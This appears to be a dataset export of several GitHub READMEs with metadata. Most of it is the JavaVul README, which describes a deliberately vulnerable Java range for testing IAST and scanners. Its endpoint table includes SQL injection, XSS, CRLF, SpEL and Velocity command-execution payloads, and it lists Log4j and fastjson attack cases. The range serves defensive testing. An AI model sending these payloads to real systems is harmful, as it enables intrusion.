      <td align=""center"" valign=""top"" width=""20%""><a href=""https://github.com/AdrishOfHogwarts""><img src=""https://avatars.githubusercontent.com/u/152976845?v=4"" width=""100px;"" alt=""""/><br /><sub><b>Adrish Bose</b></sub></a></td>
    </tr>
  </tbody>
</table>

<!-- markdownlint-restore -->
<!-- prettier-ignore-end -->

<!-- ALL-CONTRIBUTORS-LIST:END -->

## Licenses:

- [Sale Dock](https://github.com/hardingadonis/saledock) is under the [Apache-2.0 license](https://github.com/hardingadonis/saledock/blob/main/LICENSE).
- [favicon](https://github.com/hardingadonis/saledock/blob/main/src/main/webapp/assets/images/favicon/favicon.png) is under the [flaticon](https://www.flaticon.com/free-icon/sale_791968).
",10,0,2,apache-2.0,113.0,"['sale', 'dock', 'project', 'erp', 'system', 'sale', 'module', 'requirements', 'jdk', 'mysql', 'tomcat', 'maven', 'database', 'development', 'need', 'install', 'requirement', 'clone', 'open', 'open', 'favorite', 'ide', 'intellij', 'idea', 'eclipse', 'netbeans', 'build', 'optional', 'deployment', 'open', 'installation', 'guide', 'installation', 'guide', 'contributor', 'license', 'sale', 'dock', 'license', 'favicon', 'flaticon']","['sale', 'open', 'dock', 'installation', 'guide']",0,0,0,"['sale', 'dock', 'requirement', 'database', 'development', 'clone', 'sale', 'dock', 'open', 'sale', 'dock', 'build', 'sale', 'dock', 'maven', 'optional', 'deployment', 'contributor', 'license']",10,"['sale', 'dock', 'requirement', 'database', 'development']",2,0.0,1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-war-plugin]",1.0,0.0,0.0,5263,52.92857142857143,4.856950067476383,"['![build -> https://github.com/hardingadonis/saledock/actions/workflows/build.yml/badge.svg', '![publish -> https://github.com/hardingadonis/saledock/actions/workflows/publish.yml/badge.svg', '![release -> https://github.com/hardingadonis/saledock/actions/workflows/release.yml/badge.svg', '![CodeFactor -> https://www.codefactor.io/repository/github/hardingadonis/saledock/badge', 'GitHub contributors -> https://img.shields.io/github/contributors/hardingadonis/saledock', 'GitHub top language -> https://img.shields.io/github/languages/top/hardingadonis/saledock', 'GitHub repo size -> https://img.shields.io/github/repo-size/hardingadonis/saledock', 'GitHub License -> https://img.shields.io/github/license/hardingadonis/saledock', 'IntelliJ IDEA -> https://www.jetbrains.com/idea/', 'Eclipse -> https://www.eclipse.org/', 'NetBeans -> https://netbeans.apache.org/', 'Sale Dock -> https://github.com/hardingadonis/saledock', 'Apache-2.0 license -> https://github.com/hardingadonis/saledock/blob/main/LICENSE', 'favicon -> https://github.com/hardingadonis/saledock/blob/main/src/main/webapp/assets/images/favicon/favicon.png', 'flaticon -> https://www.flaticon.com/free-icon/sale_791968']",15
begcode/begcode-admin,main,"# monolithMybatis

本应用程序由BegCode8.6.3生成, 你可以在 [https://www.begcode.com](https://www.begcode.com) 找到文档和帮助。

## 截图展示

### 登录

![登录](./doc/images/login.png)

### 首页

![首页](./doc/images/index.png)

### 菜单列表

![菜单列表](./doc/images/view_permission.png)

### 角色列表

![角色列表](./doc/images/authority.png)

### 用户列表

![用户列表](./doc/images/user-list.png)

### 短信配置

![短信配置](./doc/images/sms_config.png)

### 图片上传

![图片上传](./doc/images/upload_image.png)

### 字典管理

![字典管理](./doc/images/dictionary.png)

### 操作日志

![操作日志](./doc/images/sys_log.png)

### 消息发布

![消息发布](./doc/images/announcement.png)

### Api列表

![Api列表](./doc/images/api.png)

### Icon选择参考

![Icon选择参考](./doc/images/icon_picker.png)

### 查看通知

![查看通知](./doc/images/notice.png)

## 项目结构

生成时需要 Node，并建议在开发过程中使用它。package.json 文件始终会生成，以提供更好的开发体验，包括 prettier、commit hooks、脚本等等。

在项目的根目录中，JHipster会生成用于配置诸如git、prettier、eslint、husky等众多常见工具的配置文件。你可以在网络上找到有关这些工具的参考文档。

`/src/*` 目录结构遵循默认的Java结构。

- `.yo-rc.json` - Yeoman配置文件（BegCode/JHipster配置文件）
  BegCode的配置存储在key为generator-begcode的属性中，这里定义了BegCode生成器的全局配置。此外，你可能会在项目根目录下的.yo-rc.json文件中找到类似generator-begcode-\*的蓝图配置，它包含了项目特定的配置选项。
- `.yo-resolve` (可选) - Yeoman 冲突解决器
  允许在发现冲突时使用特定操作，跳过匹配模式的文件的提示。每一行应该匹配 [模式] [操作]，其中模式是一个 Minimatch 模式，操作是 skip（如果省略则为默认操作）或者 force 中的一个。以 # 开头的行被视为注释，将被忽略。
- `.jhipster/*.json` - JHipster实体配置文件

- `npmw` - 用于本地安装的npm的包装器
  BegCode默认使用构建工具在本地安装Node和pnpm。此包装器确保本地安装pnpm并使用它，避免了不同版本可能引起的一些差异。通过使用./npmw而不是传统的npm，您可以配置一个无需Node的环境来开发或测试您的应用程序。
- `/src/main/docker` - 应用程序及其依赖的服务的Docker配置

## 开发

    构建系统将自动安装推荐的Node和pnpm版本。
    我们提供了一个包装器来启动 pnpm。

仅当 [package.json](package.json) 中的依赖项发生更改时，您才需要再次运行此命令。

```
./npmw install
```

我们使用 pnpm 脚本和 [Vite][] 作为我们的构建系统。

在两个单独的终端中运行以下命令，以创建更好的开发体验，其中当硬盘上的文件发生更改时您的浏览器自动刷新。

```
./mvnw
./npmw start
```

Npm 还用于管理此应用程序中使用的 CSS 和 JavaScript 依赖项。 您可以通过以下方式升级依赖项
在 [package.json](package.json) 中指定较新版本。 您还可以运行`pnpm update`和`pnpm install`来管理依赖项。
在任何命令上添加`help`标志以查看如何使用它。 例如，`pnpm help update`。

`./npmw run` 命令将列出可用于该项目运行的所有脚本。

## 系统构建

### 创建Jar包

要优化monolithMybatis应用程序创建Jar包并进行生产部署，请运行：

```
./mvnw package -Pprod clean verify -DskipTests
```

这将压缩客户端和重新打包CSS和JavaScript文件。 它还将修改`index.html`，以便引用这些新文件。
为了确保一切正常，请运行：

```
java -jar target/*.jar
```

然后在浏览器打开：[http://localhost:8080](http://localhost:8080)。

请参阅[Using JHipster in production][] 了解更多详细信息。

### 创建War包

要将您的应用程序打包为 war 以便将其部署到应用程序服务器，请运行：

```
./mvnw package -Pprod,war clean verify
```

### JHipster Control Center

JHipster Control Center 可以帮助您管理和控制您的应用程序。 您可以使用以下命令启动本地控制中心服务器（可通过 http://localhost:7419 访问）：

```
docker compose -f src/main/docker/jhipster-control-center.yml up
```

## 测试

### 运行Spring Boot 测试

要启动应用程序的测试，请运行：

```
./mvnw verify
```

### Client tests

Unit tests are run by [Jest][]. They're located in [front/src/test/javascript/](front/src/test/javascript/) and can be run with:

```
./npmw test
```

## 其他

### 使用Sonar进行代码质量控制

Sonar用于分析代码质量。 您可以使用以下命令启动本地 Sonar 服务器（可通过 http://localhost:9001 访问）：

```
docker compose -f src/main/docker/sonar.yml up -d
```

Note: we have turned off forced authentication redirect for UI in [src/main/docker/sonar.yml](src/main/docker/sonar.yml) for out of the box experience while trying out SonarQube, for real use cases turn it back on.

You can run a Sonar analysis with using the [sonar-scanner](https://docs.sonarqube.org/display/SCAN/Analyzing+with+SonarQube+Scanner) or by using the maven plugin.

Then, run a Sonar analysis:

```
./mvnw -Pprod clean verify sonar:sonar -Dsonar.login=admin -Dsonar.password=admin
```

If you need to re-run the Sonar phase, please be sure to specify at least the `initialize` phase since Sonar properties are loaded from the sonar-project.properties file.

```
./mvnw initialize sonar:sonar -Dsonar.login=admin -Dsonar.password=admin
```

Additionally, Instead of passing `sonar.password` and `sonar.login` as CLI arguments, these parameters can be configured from [sonar-project.properties](sonar-project.properties) as shown below:

```
sonar.login=admin
sonar.password=admin
```

For more information, refer to the [Code quality page][].

### Using Docker to simplify development (optional)

You can use Docker to improve your JHipster development experience. A number of docker-compose configuration are available in the [src/main/docker](src/main/docker) folder to launch required third party services.

For example, to start a mysql database in a docker container, run:

```
docker compose -f src/main/docker/mysql.yml up -d
```

To stop it and remove the container, run:

```
docker compose -f src/main/docker/mysql.yml down
```

You can also fully dockerize your application and all the services that it depends on.
To achieve this, first build a docker image of your app by running:

```
npm run java:docker
```

Or build a arm64 docker image when using an arm64 processor os like MacOS with M1 processor family running:

```
npm run java:docker:arm64
```

Then run:

```
docker compose -f src/main/docker/app.yml up -d
```

When running Docker Desktop on MacOS Big Sur or later, consider enabling experimental `Use the new Virtualization framework` for better processing performance ([disk access performance is worse](https://github.com/docker/roadmap/issues/7)).

For more information refer to [Using Docker and Docker-Compose][], this page also contains information on the docker-compose sub-generator (`jhipster docker-compose`), which is able to generate docker configurations for one or several JHipster applications.

## Continuous Integration (optional)

To configure CI for your project, run the ci-cd sub-generator (`jhipster ci-cd`), this will let you generate configuration files for a number of Continuous Integration systems. Consult the [Setting up Continuous Integration][] page for more information.

[BegCode最新文档]: https://www.begcode.com
[Node.js]: https://nodejs.org/
[NPM]: https://www.npmjs.com/
[Webpack]: https://webpack.github.io/
[BrowserSync]: https://www.browsersync.io/
[Jest]: https://facebook.github.io/jest/
[Leaflet]: https://leafletjs.com/
[DefinitelyTyped]: https://definitelytyped.org/
",0,1,1,mit,0.0,"['monolithmybatis', 'http', 'yeoman', 'minimatch', 'force', 'pnpm', 'vite', 'npm', 'cs', 'javascript', 'http', 'using', 'jhipster', 'production', 'war', 'jhipster', 'control', 'center', 'jhipster', 'control', 'center', 'http', 'boot', 'client', 'test', 'unit', 'test', 'run', 'jest', 'located', 'run', 'sonar', 'http', 'note', 'turned', 'forced', 'authentication', 'redirect', 'ui', 'box', 'experience', 'trying', 'sonarqube', 'real', 'use', 'case', 'turn', 'back', 'run', 'sonar', 'analysis', 'using', 'using', 'maven', 'plugin', 'run', 'sonar', 'analysis', 'need', 'sonar', 'phase', 'please', 'sure', 'specify', 'least', 'phase', 'since', 'sonar', 'property', 'loaded', 'file', 'additionally', 'instead', 'passing', 'cli', 'argument', 'parameter', 'configured', 'shown', 'information', 'refer', 'code', 'quality', 'page', 'using', 'docker', 'simplify', 'development', 'optional', 'use', 'docker', 'improve', 'jhipster', 'development', 'experience', 'number', 'configuration', 'available', 'folder', 'launch', 'required', 'third', 'party', 'service', 'example', 'start', 'mysql', 'database', 'docker', 'container', 'run', 'stop', 'remove', 'container', 'run', 'also', 'fully', 'dockerize', 'application', 'service', 'depends', 'achieve', 'first', 'build', 'docker', 'image', 'app', 'running', 'build', 'docker', 'image', 'using', 'processor', 'o', 'like', 'macos', 'processor', 'family', 'running', 'run', 'running', 'docker', 'desktop', 'macos', 'big', 'sur', 'later', 'consider', 'enabling', 'experimental', 'better', 'processing', 'performance', 'disk', 'access', 'performance', 'worse', 'information', 'refer', 'using', 'docker', 'page', 'also', 'contains', 'information', 'able', 'generate', 'docker', 'configuration', 'one', 'several', 'jhipster', 'application', 'continuous', 'integration', 'optional', 'configure', 'ci', 'project', 'run', 'let', 'generate', 'configuration', 'file', 'number', 'continuous', 'integration', 'system', 'consult', 'setting', 'continuous', 'integration', 'page', 'information']","['run', 'docker', 'using', 'jhipster', 'sonar']",1,0,0,"['monolithmybatis', 'jhipster', 'control', 'center', 'boot', 'client', 'test', 'use', 'docker', 'simplify', 'development', 'optional', 'continuous', 'integration', 'optional']",29,"['optional', 'monolithmybatis', 'jhipster', 'control', 'center']",17,2044.0,1.0,"[com.diffplug.spotless:spotless-maven-plugin,com.github.eirslett:frontend-maven-plugin,com.google.cloud.tools:jib-maven-plugin,io.github.git-commit-id:git-commit-id-maven-plugin,net.nicoulaj.maven.plugins:checksum-maven-plugin,org.apache.maven.plugins:maven-antrun-plugin,org.apache.maven.plugins:maven-checkstyle-plugin,org.apache.maven.plugins:maven-clean-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-enforcer-plugin,org.apache.maven.plugins:maven-failsafe-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-site-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.apache.maven.plugins:maven-war-plugin,org.codehaus.mojo:properties-maven-plugin,org.eclipse.m2e:lifecycle-mapping,org.gaul:modernizer-maven-plugin,org.jacoco:jacoco-maven-plugin,org.liquibase:liquibase-maven-plugin,org.sonarsource.scanner.maven:sonar-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0,6061,31.192307692307693,5.57213316892725,"['https://www.begcode.com -> https://www.begcode.com', 'http://localhost:8080 -> http://localhost:8080', 'sonar-scanner -> https://docs.sonarqube.org/display/SCAN/Analyzing+with+SonarQube+Scanner', 'disk access performance is worse -> https://github.com/docker/roadmap/issues/7', '模式', '操作', 'Vite', 'Using JHipster in production', 'Jest', 'Code quality page', 'Setting up Continuous Integration', 'BegCode最新文档', 'NPM', 'Webpack', 'BrowserSync', 'Jest', 'Leaflet', 'DefinitelyTyped']",18
lokerxx/JavaVul,master,"# JavaVul

![](https://socialify.git.ci/lokerxx/JavaVul/image?description=1&font=Inter&forks=1&name=1&owner=1&pattern=Circuit%20Board&stargazers=1&theme=Light)

## 介绍

Java 安全漏洞靶场，用于测试IAST和扫描器的被动扫描功能，集合了多个安全漏洞，利用docker镜像为每个靶场独立环境运行。

文章：[IAST实践总结](https://mp.weixin.qq.com/s/ahxKXv5eKcULVF_VqAjbyg)

## 部署

mvn版本

```sh
# mvn --version
Apache Maven 3.0.5 (Red Hat 3.0.5-17)
Maven home: /usr/share/maven
Java version: 1.8.0_192, vendor: Oracle Corporation
Java home: /usr/java/jdk1.8.0_192/jre
Default locale: en_US, platform encoding: UTF-8
OS name: ""linux"", version: ""3.10.0-1160.el7.x86_64"", arch: ""amd64"", family: ""unix""
```

docker和docker-compose版本

```sh
# docker version
Client:
 Version:         1.13.1
 API version:     1.26
 Package version: docker-1.13.1-209.git7d71120.el7.centos.x86_64
 Go version:      go1.10.3
 Git commit:      7d71120/1.13.1
 Built:           Wed Mar  2 15:25:43 2022
 OS/Arch:         linux/amd64

Server:
 Version:         1.13.1
 API version:     1.26 (minimum version 1.12)
 Package version: docker-1.13.1-209.git7d71120.el7.centos.x86_64
 Go version:      go1.10.3
 Git commit:      7d71120/1.13.1
 Built:           Wed Mar  2 15:25:43 2022
 OS/Arch:         linux/amd64
 Experimental:    false

# docker-compose version
docker-compose version 1.18.0, build 8dd22a9
docker-py version: 2.6.1
CPython version: 3.6.8
OpenSSL version: OpenSSL 1.0.2k-fips  26 Jan 2017
```

> 默认docker和docker-compose太低，需要安装比较新的
>
> ```
>  yum remove docker \
>               docker-client \
>               docker-client-latest \
>               docker-common \
>               docker-latest \
>               docker-latest-logrotate \
>               docker-logrotate \
>               docker-engine
> 
> sudo yum install -y yum-utils
> sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo
> 
> sudo yum install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin docker-compose
> ```

下载项目

```sh
git clone https://github.com/lokerxx/JavaVul
```

以下是运行脚本：

|            文件            |                             作用                             |            运行            |
| :------------------------: | :----------------------------------------------------------: | :------------------------: |
| docker-compose-build.yaml  | 在容器里面构建jar包，每个靶场构建会重复构建（**构建速度会很慢，不建议**） | `bash run-build_images.sh` |
| docker-compose-local.yaml  | 宿主机maven构建各个靶场的jar包，多个靶场可以基于maven缓存快速构建（**推荐**） | `bash run-local-build.sh`  |
| docker-compose-remote.yaml | 直接去dockerhub下载我构建上传成功的镜像（**镜像更新不及时**） |    `bash run-remote.sh`    |

> 此外，需修改yaml文件里面`flask.environment.HOST`为宿主机的IP，用于跑测试用例。**然后我在yaml文件已经默认挂载agent.jar**，如果你们要测试IAST agent功能，直接替换到`agent/agent.jar`即可。我这边自己写了一个简单的java agent，参考下面[SimpleAgent]()

> 如果要测试被动代理扫描，需要修改`index/app.py`里面`proxy_mode`为`True`，修改自己的代理地址：`proxies`

> **修改完成之后，根据自己的需求，运行上面表格的sh脚本部署运行即可**。

> 因为漏洞应用比较多**但是接口比较少**，我给每个应用配置512-1024M内存（测试运行要16G内存）。如果要配置大一点测试 IAST AGENT，则可以批量修改`docker-compose.yaml`的`-Xms512m -Xmx1024m`的环境变量

> 基本web漏洞的代码审计的细节，参考这里：https://github.com/lokerxx/CybersecurityNote/tree/master/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA%E6%BC%8F%E6%B4%9E



### 压力测试

部署运行

|              文件               |                         作用                         |          运行          |
| :-----------------------------: | :--------------------------------------------------: | :--------------------: |
| docker-compose-microservice.yml | 运行多个springcloud微服务，用于测试多链路 IAST agent | `run-local-service.sh` |

测试用例

| 接口                                            | 压测命令                                                     |
| ----------------------------------------------- | ------------------------------------------------------------ |
| http://ip:29998/process-user-data?userData=test | ` ab -n 1000 -c 20 ""http://IP:29998/process-user-data?userData=test""` |



## 支持靶场

|          文件夹           |                           安全漏洞                           |  测试用途  |                       备注                        |
| :-----------------------: | :----------------------------------------------------------: | :--------: | :-----------------------------------------------: |
|  actuator_authorized_1.X  |                   actuator 未授权访问 1.X                    |    修复    |                                                   |
|  actuator_authorized_2.X  |                   actuator 未授权访问 2.X                    |    修复    |                                                   |
| actuator_unauthorized_1.X |                   actuator 未授权访问 1.X                    |    漏洞    |                                                   |
| actuator_unauthorized_2.X |                   actuator 未授权访问 2.X                    |    漏洞    |                                                   |
|         base_vul          | SQL注入、XSS、不安全文件操作、重定向漏洞、正则DOS漏洞、Crlf注入漏洞、命令注入漏洞、SPEL漏洞、SSRF漏洞、SSTI漏洞、不安全反射漏洞、XXE漏洞 |    漏洞    |                                                   |
|      base_vul_repair      | SQL注入、XSS、不安全文件操作、重定向漏洞、正则DOS漏洞、Crlf注入漏洞、命令注入漏洞、SPEL漏洞、SSRF漏洞、SSTI漏洞、不安全反射漏洞、XXE漏洞 |    修复    |                                                   |
|          cas_xxe          |                           XXE漏洞                            |    漏洞    | cas在3.1.1-3.5.1存在XXE漏洞<br />修复版本为3.6.0- |
|        collections        |                     collections 反序列化                     | **未完成** |                                                   |
|      CVE-2019-10173       |                     XStream反序列化漏洞                      |    漏洞    |                                                   |
|      CVE-2019-12384       |                jackson-databind 反序列化漏洞                 |    漏洞    |                                                   |
|     druid_authorized      |                       druid未授权漏洞                        |    修复    |                                                   |
|    druid_unauthorized     |                       druid未授权漏洞                        |    漏洞    |                                                   |
|        fastjson-*         |                 各个版本fastjson反序列化漏洞                 |    漏洞    |                                                   |
|         Hibernate         |                      Hibernate 注入漏洞                      | 修复、漏洞 |                                                   |
|          HSQLDB           |                       HSQLDB 注入漏洞                        | 修复、漏洞 |                                                   |
|            jsp            |                                                              | **未完成** |                  jsp版的base_vul                  |
|         log4jvul          |                         log4j2 漏洞                          |    漏洞    |                                                   |
|  microservice-*-service   |                          分布式服务                          |  性能测试  |            用于验证分布式微服务的性能             |
|         wxpay-xxe         |                       微信支付XXE漏洞                        |    漏洞    |                                                   |
|         logic_vul         |                        业务逻辑漏洞：                        |            |                                                   |
|                           |                                                              |            |                                                   |
|                           |                                                              |            |                                                   |
|                           |                                                              |            |                                                   |





## 运行

访问：`http://宿主机IP:5000/`

我配置了三种模式：

- 攻击：发送一些payload，触发漏洞
- 正常：有可能是漏洞，但是发送是正常的数据
- 修复：漏洞已经修复，但是payload不生效（过滤或者报错）
- 误报：IAST或SAST误报检测的安全漏洞

其中右边测试按钮，可以对这个接口进行用例测试。

![image-20240306164920221](.gitbook/assets/image-20240306164920221.png)

也可以自定义发送payload，进行调试

![image-20240306165001240](.gitbook/assets/image-20240306165001240.png)

也可以批量发送请求，各个漏洞的回显，会在下面显示。

![image-20240127215349622](.gitbook/assets/image-20240127215349622.png)



## SimpleAgent

Java Agent 是一种工具，它可以使用 Java Instrumentation API 在运行时修改字节码。一个非常简单的 Java Agent 可以仅仅记录一个消息，以表明它已被加载。

首先，创建 Agent 类 `SimpleAgent.java`：

```java
package my.agent;

import java.lang.instrument.Instrumentation;

public class SimpleAgent {
    public static void premain(String agentArgs, Instrumentation inst) {
        System.out.println(""SimpleAgent 已加载"");
    }
}
```

在这段代码中，`premain` 方法是 Java Agent 的入口点。它在应用程序的 `main` 方法之前被调用。

接下来，你需要一个 manifest 文件来指定 Agent-Class。创建一个名为 `MANIFEST.MF` 的文件，内容如下：

```
Manifest-Version: 1.0
Premain-Class: my.agent.SimpleAgent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```

这个 manifest 文件指定了 agent 类并启用了一些功能，如类的重定义和重转换。

现在，将 Java Agent 编译并打包成 JAR 文件。假设你的 Java 文件在 `src` 目录中，使用 `javac` 和 `jar` 命令，你可以这样做：

1. 编译 agent 类：

```sh
# javac -source 1.8 -target 1.8 -d . src/main/java/my/agent/SimpleAgent.java
```

2. 将编译后的类打包成带有 manifest 的 JAR 文件：

```sh
# jar cvfm SimpleAgent.jar MANIFEST.MF my/agent/SimpleAgent.class
added manifest
adding: my/agent/SimpleAgent.class(in = 492) (out= 320)(deflated 34%)
```

现在你有了一个可以作为 Java Agent 使用的 `SimpleAgent.jar`。要将这个 agent 附加到你的应用程序上，启动 Java 应用程序时使用 `-javaagent` 选项，将`SimpleAgent.jar`重命名到`./agent/agent.jar`

```sh
# mv SimpleAgent.jar ../agent/agent.jar
```



## 支持测试的漏洞

| 接口 | 漏洞名字 | 请求方法 | url | 接口类型 |
| :----------------------------------------: | :---------------------------------------------------------: | -------- | :----------------------------------------------------------: | :------: |
| druid_authorized | druid未授权漏洞 | GET | http://192.168.0.9:9996/druid | 修复 |
| actuator2_authorized | SpringBoot Actuator未授权访问漏洞2.X | GET | http://192.168.0.9:9994/actuator | 修复 |
| actuator1_authorized | SpringBoot Actuator未授权访问漏洞1.X | GET | http://192.168.0.9:9992/trace | 修复 |
| sql_injection_id_repair | SQL注入-mybatics-数字 | GET | http://192.168.0.9:9990/users/1'/ | 修复 |
| sql_injection_ids_repair | SQL注入-mybatics-数组 | GET | http://192.168.0.9:9990/users/ids/?ids=1,2,3' | 修复 |
| sql_injection_like_repair | SQL注入-mybatics-like模糊匹配 | GET | http://192.168.0.9:9990/users/name?name=A' | 修复 |
| sql_injection_strs_repair | SQL注入-mybatics-字符串数组 | GET | http://192.168.0.9:9990/users/names?names=Alice&names=Bob' | 修复 |
| sql_injection_orderby_repair | SQL注入-mybatics-排序 | GET | http://192.168.0.9:9990/users/sort?orderByColumn=name&orderByDirection=asc' | 修复 |
| xss_reflect_htmlEscape_repair | 反射型XSS漏洞-htmlEscape类 | GET | http://192.168.0.9:9990/xss_reflect_htmlEscape?name=<script>alert(123)</script> | 修复 |
| xss_reflect_escapeHtml4_repair | 反射型XSS漏洞-escapeHtml4类 | GET | http://192.168.0.9:9990/xss_reflect_escapeHtml4?name=<script>alert(123)</script> | 修复 |
| xss_reflect_escapeHtml_reparir | 反射型XSS漏洞-html编码 | GET | http://192.168.0.9:9990/xss_reflect_escapeHtml?name=<script>alert(123)</script> | 修复 |
| xss_storage_thymeleaf_reparir | 存储型XSS漏洞-thymeleaf模板过滤 | GET | http://192.168.0.9:9990/xss_storage_thymeleaf?name=<script>alert(123)</script> | 修复 |
| file_upload_repair | 任意文件上传漏洞 | POST | http://192.168.0.9:9990/file_upload | 修复 |
| file_read_repair | 文件读取漏洞 | GET | http://192.168.0.9:9990/file_read?filePath=pom.xml | 修复 |
| file_write_repair | 任意文件写入漏洞 | GET | http://192.168.0.9:9990/file_write?fileName=test.txt&data=test | 修复 |
| file_download_repair | 任意文件下载漏洞 | GET | http://192.168.0.9:9990/file_download?fileName=../test.log | 修复 |
| file_delete_repair | 任意文件删除漏洞 | GET | http://192.168.0.9:9990/file_delete?fileName=test.txt | 修复 |
| runtime_command_execute_repair | 命令执行漏洞-Runtime | GET | http://192.168.0.9:9990/runtime_command_execute?command=whoami | 修复 |
| process_builder_command_repair | 命令执行漏洞-ProcessBuilder | GET | http://192.168.0.9:9990/process_builder_command_execute?command=whoami | 修复 |
| crlf_injection_repair | CRLF注入 | GET | http://192.168.0.9:9990/crlf_injection?name=%0D%0ASet-Cookie: sessionid=123456 | 修复 |
| spel_expression_repair | SPEL表达式攻击 | GET | http://192.168.0.9:9990/spel_expression?input=T(java.lang.Runtime).getRuntime().exec('whoami') | 修复 |
| ssrf_openStream_repair | SSRF攻击-openStream | GET | http://192.168.0.9:9990/ssrf_openStream?url=https://www.baidu.com | 修复 |
| ssrf_openConnection_repair | SSRF攻击-openConnection | GET | http://192.168.0.9:9990/ssrf_openConnection?url=http://www.baidu.com | 修复 |
| ssrf_requestGet_repair | SSRF攻击-requestGet | GET | http://192.168.0.9:9990/ssrf_requestGet?url=http://www.baidu.com | 修复 |
| ssrf_okhttp_repair | SSRF攻击-okhttp | GET | http://192.168.0.9:9990/ssrf_okhttp?url=http://www.baidu.com | 修复 |
| ssrf_defaultHttpClient_repair | SSRF攻击-defaultHttpClient | GET | http://192.168.0.9:9990/ssrf_defaultHttpClient?url=http://www.baidu.com | 修复 |
| ssti_velocity_repair | SSTI攻击-velocity | GET | http://192.168.0.9:9990/ssti_velocity?content=%23set (%24exp %3d ""exp"")%3b%24exp.getClass().forName(""java.lang.Runtime"").getRuntime().exec(""whoami"") | 修复 |
| xxe_saxparserfactory_repair | XXE-saxparserfactory | POST | http://192.168.0.9:9990/xxe_saxparserfactory | 修复 |
| xxe_xmlreaderfactory_repair | XXE-xmlreaderfactory | POST | http://192.168.0.9:9990/xxe_xmlreaderfactory | 修复 |
| xxe_saxbuilder_repair | XXE-saxbuilder | POST | http://192.168.0.9:9990/xxe_saxbuilder | 修复 |
| xxe_saxreader_repair | XXE-saxreader | POST | http://192.168.0.9:9990/xxe_saxreader | 修复 |
| xxe_documentbuilderfactory_repair | XXE-documentbuilderfactory | POST | http://192.168.0.9:9990/xxe_documentbuilderfactory | 修复 |
| xxe_documentbuilderfactory_xinclude_repair | XXE-documentbuilderfactory_xinclude | POST | http://192.168.0.9:9990/xxe_documentbuilderfactory_xinclude | 修复 |
| OpenRedirector_ModelAndView_repair | URL重定向漏洞-ModelAndView | GET | http://192.168.0.9:9990/OpenRedirector_ModelAndView?url=https://www.baidu.com | 修复 |
| OpenRedirector_sendRedirect_repair | URL重定向漏洞-sendRedirect | GET | http://192.168.0.9:9990/OpenRedirector_sendRedirect?url=https://www.baidu.com | 修复 |
| OpenRedirector_lacation_repair | URL重定向漏洞-location | GET | http://192.168.0.9:9990/OpenRedirector_lacation?url=https://www.baidu.com | 修复 |
| swagger-ui_repair | swagger-ui-未授权访问漏洞 | GET | http://192.168.0.9:9990/swagger-ui.html | 修复 |
| sql_injection_Optional_repair | SQL注入-Optional<String> | GET | http://192.168.0.9:9990/users/findByOptionalUsername?username=test' | 修复 |
| sql_injection_Object_repair | SQL注入-Object[] | POST | http://192.168.0.9:9990/users/get_name_object | 修复 |
| sql_injection_Annotation_repair | SQL注入-MyBatis注解方式 | GET | http://192.168.0.9:9990/users/by-username?name=test | 修复 |
| sql_injection_lombok_repair | SQL注入-lombok | POST | http://192.168.0.9:9990/users/lombok | 修复 |
| sql_injection_hsqldb_repair | SQL注入-hsqldb | GET | http://192.168.0.9:9989/hsqldb_repair?username=1' | 修复 |
| sql_injection_Hibernate_repair | SQL注入-Hibernate | GET | http://192.168.0.9:9988/Hibernate_injection_repair?username=foobar' OR (SELECT COUNT(*) FROM User)>=0 OR 'foobar'=' | 修复 |
| log4j2_attack | Log4j2 远程代码执行漏洞（CVE-2021-44228） | POST | http://192.168.0.9:9998/log4j2 | 攻击 |
| fastjson1_2_24_attack | fastjson-1.2.24反序列漏洞 | POST | http://192.168.0.9:9999/fastjson1.2.24-process | 攻击 |
| fastjson1_2_25_attack | fastjson-1.2.25-1.2.47反序列漏洞-不需要AutoTypeSupport-通杀 | POST | http://192.168.0.9:9987/fastjson1.2.25-process | 攻击 |
| fastjson1_2_41_attack | fastjson-1.2.25-1.2.41反序列漏洞-setAutoTypeSupport | POST | http://192.168.0.9:9987/fastjson1.2.41-process-setAutoTypeSupport | 攻击 |
| fastjson1_2_42_attack | fastjson-1.2.42反序列漏洞 | POST | http://192.168.0.9:9986/fastjson1.2.42-process | 攻击 |
| fastjson1_2_43_attack | fastjson-1.2.43反序列漏洞 | POST | http://192.168.0.9:9985/fastjson1.2.43-process | 攻击 |
| fastjson1_2_45_attack | fastjson-1.2.45反序列漏洞 | POST | http://192.168.0.9:9984/fastjson1.2.45-process | 攻击 |
| fastjson1_2_59_attack_1 | fastjson-1.2.59反序列漏洞(1.2.5 <= 1.2.59)-payload1 | POST | http://192.168.0.9:9983/fastjson1.2.59-process | 攻击 |
| fastjson1_2_59_attack_2 | fastjson-1.2.59反序列漏洞(1.2.5 <= 1.2.59)-payload2 | POST | http://192.168.0.9:9983/fastjson1.2.59-process | 攻击 |
| fastjson1_2_60_attack_1 | fastjson-1.2.60反序列漏洞(1.2.5 <= 1.2.60)-payload1 | POST | http://192.168.0.9:9982/fastjson1.2.60-process | 攻击 |
| fastjson1_2_60_attack_2 | fastjson-1.2.60反序列漏洞(1.2.5 <= 1.2.60)-payload2 | POST | http://192.168.0.9:9982/fastjson1.2.60-process | 攻击 |
| fastjson1_2_61_attack_1 | fastjson-1.2.61反序列漏洞-payload1 | POST | http://192.168.0.9:9981/fastjson1.2.61-process | 攻击 |
| fastjson1_2_61_attack_2 | fastjson-1.2.61反序列漏洞-payload2 | POST | http://192.168.0.9:9981/fastjson1.2.61-process | 攻击 |
| fastjson1_2_62_attack_1 | fastjson-1.2.62反序列漏洞-payload1 | POST | http://192.168.0.9:9980/fastjson1.2.62-process | 攻击 |
| fastjson1_2_62_attack_2 | fastjson-1.2.62反序列漏洞-payload2 | POST | http://192.168.0.9:9980/fastjson1.2.62-process | 攻击 |
| fastjson1_2_66_attack_1 | fastjson-1.2.66反序列漏洞-payload1 | POST | http://192.168.0.9:9979/fastjson1.2.66-process | 攻击 |
